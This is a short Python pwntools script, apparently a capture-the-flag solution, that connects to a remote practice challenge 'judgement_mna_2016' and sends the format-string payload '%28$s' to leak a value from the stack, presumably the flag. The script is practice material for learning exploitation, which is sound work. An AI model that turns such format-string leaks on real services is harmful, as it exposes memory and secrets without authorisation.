#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/26 21:31:41
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
if debug:
    sh = process('judgement_mna_2016')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 29532
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('judgement_mna_2016')

sh.recvuntil("Input flag >> ")
sh.sendline("%28$s")
sh.interactive()